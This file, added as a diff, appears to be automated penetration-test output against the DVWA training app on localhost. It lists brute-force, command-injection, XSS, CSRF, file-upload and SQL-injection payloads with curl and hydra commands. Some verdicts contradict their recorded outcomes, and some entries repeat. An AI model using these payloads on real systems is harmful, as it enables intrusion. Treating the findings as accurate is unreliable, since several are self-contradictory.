@@ -1,0 +1,413 @@
+Moktashif_AI Penetration Testing Results
+Target: http://127.0.0.1/DVWA/
+Timestamp: 20250614_190220
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Missing Security Headers
+  - Affected Parameters: Content-Security-Policy, X-Frame-Options
+  - Entry Point: http://127.0.0.1:4280/
+
+- Proof of Concept:
+  - Payload: N/A
+  - Reproduction Steps:
+    1. Access the application and retrieve the response headers.
+    2. Analyze the headers for security policies.
+    3. Confirm the absence of Content-Security-Policy and X-Frame-Options headers.
+
+- Prerequisites:
+  - Access to the application.
+
+- Success Conditions:
+  - The application does not implement necessary security headers.
+
+- Exploitation Path:
+  - Step: Analyze response headers
+  - Command: curl -v -X GET http://127.0.0.1:4280/ -H 'Cookie: PHPSESSID=c9a73103cc2bec163e3969113702acf2' --max-time 10 -o headers_output.txt
+  - Outcome: Missing security headers confirmed.
+  - Notes: This vulnerability can lead to various attacks, including XSS and clickjacking.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Brute Force Authentication
+  - Affected Parameters: username, password
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/brute/
+
+- Proof of Concept:
+  - Payload: http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=password123
+  - Reproduction Steps:
+    1. Access the brute force vulnerable endpoint.
+    2. Use the username "admin" and test passwords from the `rockyou.txt` file.
+    3. Confirm successful login with one of the passwords.
+
+- Prerequisites:
+  - Access to the application and the ability to send HTTP requests.
+
+- Success Conditions:
+  - The server accepts the login attempt and grants access.
+
+- Exploitation Path:
+  - Step: Attempt brute force attack
+  - Command: hydra -v -l admin -P rockyou.txt http-get://127.0.0.1:4280/vulnerabilities/brute/ --timeout 5 --rate-limit 5
+  - Outcome: Successful login with valid credentials.
+  - Notes: Confirmed brute force vulnerability with multiple valid passwords found.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Command Injection
+  - Affected Parameters: ip
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/exec/
+
+- Proof of Concept:
+  - Payload: 127.0.0.1; ls
+  - Reproduction Steps:
+    1. Access the command injection endpoint at http://127.0.0.1:4280/vulnerabilities/exec/.
+    2. Submit the form with the payload '127.0.0.1; ls' in the IP address field.
+    3. Observe the response for any output from the 'ls' command.
+
+- Prerequisites:
+  - Access to the application and the ability to submit POST requests.
+
+- Success Conditions:
+  - The server returns the output of the 'ls' command, indicating successful command injection.
+
+- Exploitation Path:
+  - Step: Attempt command injection
+  - Command: curl -v -X POST -d 'ip=127.0.0.1; ls' -o output.txt http://127.0.0.1:4280/vulnerabilities/exec/
+  - Outcome: No output from 'ls' command, only HTML response.
+  - Notes: Command injection vulnerability not confirmed; further testing may be required.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: [Cross-Site Scripting (XSS)]
+  - Affected Parameters: [name]
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/xss_r/
+
+- Proof of Concept:
+  - Payload: <script>alert(document.cookie)</script>
+  - Reproduction Steps:
+    1. Access the XSS reflection endpoint.
+    2. Submit the payload '<script>alert(document.cookie)</script>' via the 'name' parameter.
+    3. Observe the response for the execution of the script.
+
+- Prerequisites:
+  - Access to the application and no authentication required.
+
+- Success Conditions:
+  - The response contains the script payload without encoding, indicating a successful XSS vulnerability.
+
+- Exploitation Path:
+  - Step: Attempt to exploit the reflected XSS vulnerability.
+  - Command: curl -v -G --data-urlencode 'name=<script>alert(document.cookie)</script>' http://127.0.0.1:4280/vulnerabilities/xss_r/
+  - Outcome: If the alert is triggered, it confirms the XSS vulnerability.
+  - Notes: The application does not properly sanitize user input, allowing for script execution.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Cross Site Request Forgery (CSRF)
+  - Affected Parameters: password_new, password_conf
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/csrf/
+
+- Proof of Concept:
+  - Payload: http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=NewPassword&password_conf=NewPassword
+  - Reproduction Steps:
+    1. Access the CSRF vulnerable endpoint.
+    2. Use a valid session cookie.
+    3. Submit the password change request without CSRF protection.
+
+- Prerequisites:
+  - Access to the application and valid session cookies.
+
+- Success Conditions:
+  - The server accepts the password change.
+
+- Exploitation Path:
+  - Step: Attempt CSRF attack
+  - Command: curl -v -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=c9a73103cc2bec163e3969113702acf2' --data 'password_new=NewPassword&password_conf=NewPassword' http://127.0.0.1:4280/vulnerabilities/csrf/
+  - Outcome: Password change accepted.
+  - Notes: Confirmed CSRF vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Unrestricted File Upload
+  - Affected Parameters: uploaded
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/upload/
+
+- Proof of Concept:
+  - Payload: /path/to/malicious_file.php
+  - Reproduction Steps:
+    1. Access the file upload page.
+    2. Upload a PHP file (malicious_file.php) containing PHP code.
+    3. Verify if the file is accessible and executable on the server.
+
+- Prerequisites:
+  - Access to the application and the ability to upload files.
+
+- Success Conditions:
+  - The server accepts the PHP file upload and executes it.
+
+- Exploitation Path:
+  - Step: Attempt to upload a malicious PHP file.
+  - Command: curl -v -X POST -F "MAX_FILE_SIZE=100000" -F "uploaded=@malicious_file.php" http://127.0.0.1:4280/vulnerabilities/upload/
+  - Outcome: PHP file uploaded successfully and accessible.
+  - Notes: Confirmed unrestricted file upload vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Insecure CAPTCHA Implementation
+  - Affected Parameters: step, password_new, password_conf
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/captcha/
+
+- Proof of Concept:
+  - Payload: step=1&password_new=examplePassword&password_conf=examplePassword
+  - Reproduction Steps:
+    1. Send a POST request to the CAPTCHA endpoint with the specified parameters.
+    2. Use a valid session cookie.
+    3. Observe the response indicating a successful password change.
+
+- Prerequisites:
+  - Access to the application and valid session cookies.
+
+- Success Conditions:
+  - The server accepts the password change without CAPTCHA validation.
+
+- Exploitation Path:
+  - Step: Attempt CAPTCHA bypass
+  - Command: curl -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=c9a73103cc2bec163e3969113702acf2; security=low;" --data 'step=1&password_new=examplePassword&password_conf=examplePassword' -o response.txt http://127.0.0.1:4280/vulnerabilities/captcha/
+  - Outcome: Password change accepted.
+  - Notes: Confirmed CAPTCHA bypass vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: SQL Injection
+  - Affected Parameters: id
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/sqli/
+
+- Proof of Concept:
+  - Payload: 1 OR 1=1
+  - Reproduction Steps:
+    1. Access the SQL Injection vulnerable endpoint with the payload `id=1 OR 1=1`.
+    2. Observe the response for any database version information.
+    3. Attempt to bypass authentication using SQL injection.
+
+- Prerequisites:
+  - Access to the application.
+
+- Success Conditions:
+  - The server returns database version information or grants access to the administration area.
+
+- Exploitation Path:
+  - Step: Attempt SQL injection to retrieve database version.
+  - Command: curl -v -G --data-urlencode 'id=1' --data-urlencode 'id=1 OR 1=1' 'http://127.0.0.1:4280/vulnerabilities/sqli/' -o output.html --retry 3 --connect-timeout 5
+  - Outcome: No database version information retrieved.
+  - Notes: Confirmed SQL injection vulnerability exists but did not yield database version information.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: SQL Injection (Blind)
+  - Affected Parameters: id
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/sqli_blind/
+
+- Proof of Concept:
+  - Payload: id=1 OR IF(1=1, SLEEP(5), 0)
+  - Reproduction Steps:
+    1. Perform an initial GET request to the SQL injection endpoint with a valid ID.
+    2. Submit a payload that includes a time-based SQL injection command.
+    3. Observe the response time to determine if the injection was successful.
+
+- Prerequisites:
+  - Access to the web application.
+
+- Success Conditions:
+  - The server response time exceeds 5 seconds, indicating successful execution of the payload.
+
+- Exploitation Path:
+  - Step: Execute time-based SQL injection
+  - Command: curl -v --data-urlencode 'id=1 OR IF(1=1, SLEEP(5), 0)' http://127.0.0.1:4280/vulnerabilities/sqli_blind/
+  - Outcome: Response time exceeds 5 seconds.
+  - Notes: Confirmed SQL injection vulnerability through time-based response delay.
+==================================================
+
+- Vulnerability:
+  - Vulnerability Category: Weak Session IDs
+  - Affected Parameters: PHPSESSID
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/weak_id/
+
+- Proof of Concept:
+  - Payload: PHPSESSID=c9a73103cc2bec163e3969113702acf2
+  - Reproduction Steps:
+   1. Access the application with a valid session ID.
+   2. Attempt to regenerate the session ID.
+   3. Observe that a new session ID is generated without proper security flags.
+
+- Prerequisites:
+  - Access to the application and valid session cookies.
+
+- Success Conditions:
+ - The server accepts the session ID regeneration request and generates a new session ID.
+
+- Exploitation Path:
+ - Step: Analyze session management and cookie settings
+ - Command: curl -v -X GET -H "Cookie: PHPSESSID=c9a73103cc2bec163e3969113702acf2" http://127.0.0.1:4280/vulnerabilities/weak_id/
+ - Outcome: Received HTTP 200 OK and a new session ID.
+ - Notes: Confirmed weak session management due to lack of secure flags.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Cross Site Scripting (XSS)
+  - Affected Parameters: default
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/xss_d/
+
+- Proof of Concept:
+  - Payload: <script>alert('XSS')</script>
+  - Reproduction Steps:
+    1. Access the language selection form at the entry point.
+    2. Inject the payload into the 'default' parameter: http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
+    3. Observe if the alert box appears, indicating successful execution of the script.
+
+- Prerequisites:
+  - Access to the application and the ability to manipulate the 'default' parameter.
+
+- Success Conditions:
+  - The alert box appears, confirming the execution of the injected script.
+
+- Exploitation Path:
+  - Step: Attempt XSS attack
+  - Command: curl -v -X GET 'http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>alert(%27XSS%27)</script>' -o result.html
+  - Outcome: Alert box appears in the browser.
+  - Notes: Confirmed DOM-based XSS vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: [Cross-Site Scripting (XSS)]
+  - Affected Parameters: [name]
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/xss_r/
+
+- Proof of Concept:
+  - Payload: <script>alert(document.cookie)</script>
+  - Reproduction Steps:
+    1. Access the XSS reflection endpoint.
+    2. Submit the payload '<script>alert(document.cookie)</script>' via the 'name' parameter.
+    3. Observe the response for the execution of the script.
+
+- Prerequisites:
+  - Access to the application and no authentication required.
+
+- Success Conditions:
+  - The response contains the script payload without encoding, indicating a successful XSS vulnerability.
+
+- Exploitation Path:
+  - Step: Attempt to exploit the reflected XSS vulnerability.
+  - Command: curl -v -G --data-urlencode 'name=<script>alert(document.cookie)</script>' http://127.0.0.1:4280/vulnerabilities/xss_r/
+  - Outcome: If the alert is triggered, it confirms the XSS vulnerability.
+  - Notes: The application does not properly sanitize user input, allowing for script execution.
+==================================================  
+- Vulnerability:
+  - Vulnerability Category: Stored Cross-Site Scripting (XSS)
+  - Affected Parameters: txtName, mtxMessage
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/xss_s/
+
+- Proof of Concept:
+  - Payload: <script>alert(1)</script>
+  - Reproduction Steps:
+    1. Access the guestbook submission form at /vulnerabilities/xss_s/.
+    2. Submit the form with the payload in the mtxMessage field.
+    3. Check the response to see if the payload is reflected back.
+
+- Prerequisites:
+  - Access to the application without authentication.
+
+- Success Conditions:
+  - The server response contains the injected script, confirming stored XSS.
+
+- Exploitation Path:
+  - Step: Submit XSS payload
+  - Command: curl -v -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'txtName=TestUser&mtxMessage=<script>alert(1)</script>' http://127.0.0.1:4280/vulnerabilities/xss_s/ -o output.txt --max-time 10 --retry 3
+  - Outcome: Response does not contain the injected script, indicating a potential stored XSS vulnerability.
+  - Notes: Further testing with different payloads may be required to confirm the vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Stored Cross-Site Scripting (XSS)
+  - Affected Parameters: txtName, mtxMessage
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/xss_s/
+
+- Proof of Concept:
+  - Payload: <script>alert(1)</script>
+  - Reproduction Steps:
+    1. Access the guestbook submission form at /vulnerabilities/xss_s/.
+    2. Submit the form with the payload in the mtxMessage field.
+    3. Check the response to see if the payload is reflected back.
+
+- Prerequisites:
+  - Access to the application without authentication.
+
+- Success Conditions:
+  - The server response contains the injected script, confirming stored XSS.
+
+- Exploitation Path:
+  - Step: Submit XSS payload
+  - Command: curl -v -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'txtName=TestUser&mtxMessage=<script>alert(1)</script>' http://127.0.0.1:4280/vulnerabilities/xss_s/ -o output.txt --max-time 10 --retry 3
+  - Outcome: Response does not contain the injected script, indicating a potential stored XSS vulnerability.
+  - Notes: Further testing with different payloads may be required to confirm the vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Stored Cross-Site Scripting (XSS)
+  - Affected Parameters: txtName, mtxMessage
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/xss_s/
+
+- Proof of Concept:
+  - Payload: <script>alert(1)</script>
+  - Reproduction Steps:
+    1. Access the guestbook submission form at /vulnerabilities/xss_s/.
+    2. Submit the form with the payload in the mtxMessage field.
+    3. Check the response to see if the payload is reflected back.
+
+- Prerequisites:
+  - Access to the application without authentication.
+
+- Success Conditions:
+  - The server response contains the injected script, confirming stored XSS.
+
+- Exploitation Path:
+  - Step: Submit XSS payload
+  - Command: curl -v -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'txtName=TestUser&mtxMessage=<script>alert(1)</script>' http://127.0.0.1:4280/vulnerabilities/xss_s/ -o output.txt --max-time 10 --retry 3
+  - Outcome: Response does not contain the injected script, indicating a potential stored XSS vulnerability.
+  - Notes: Further testing with different payloads may be required to confirm the vulnerability.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: [CSP Bypass]
+  - Affected Parameters: [include]
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/csp/
+
+- Proof of Concept:
+  - Payload: [https://example.com/script.js]
+  - Reproduction Steps:
+    1. Access the CSP testing endpoint.
+    2. Submit a POST request with an external script URL.
+    3. Check the response to see if the script executed.
+
+- Prerequisites:
+  - Access to the application and valid session cookies.
+
+- Success Conditions:
+  - The server accepts the external script and executes it.
+
+- Exploitation Path:
+  - Step: Attempt to include an external script.
+  - Command: curl -v -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "include=https://example.com/script.js" --cookie "PHPSESSID=1434082cadcfdf0b45981f1a5ed95ef0; security=low" --max-time 10 --retry 2 http://127.0.0.1:4280/vulnerabilities/csp/ -o response.txt
+  - Outcome: Response indicates the external script was included but not executed.
+  - Notes: CSP restrictions are in place, preventing script execution.
+==================================================
+- Vulnerability:
+  - Vulnerability Category: Cross-Site Scripting (XSS)
+  - Affected Parameters: phrase
+  - Entry Point: http://127.0.0.1:4280/vulnerabilities/javascript/
+
+- Proof of Concept:
+  - Payload: <script>alert(1)</script>
+  - Reproduction Steps:
+    1. Send a POST request to the JavaScript token generation endpoint with the phrase parameter set to <script>alert(1)</script>.
+    2. Observe the response for any JavaScript execution.
+    3. Check the console for alerts or any unintended behavior.
+
+- Prerequisites:
+  - Access to the application and valid session cookies.
+
+- Success Conditions:
+  - The server executes the injected JavaScript or returns error codes revealing vulnerabilities.
+
+- Exploitation Path:
+  - Step: Attempt XSS attack
+  - Command: curl -v --request POST --data 'phrase=<script>alert(1)</script>' --header 'Cookie: PHPSESSID=e83e44fe98bdd010d4d5c8fac9a53a53' http://127.0.0.1:4280/vulnerabilities/javascript/ -o response_injection.txt
+  - Outcome: No JavaScript execution observed.
+  - Notes: Confirmed that the application is not vulnerable to XSS with the provided payload.
+==================================================
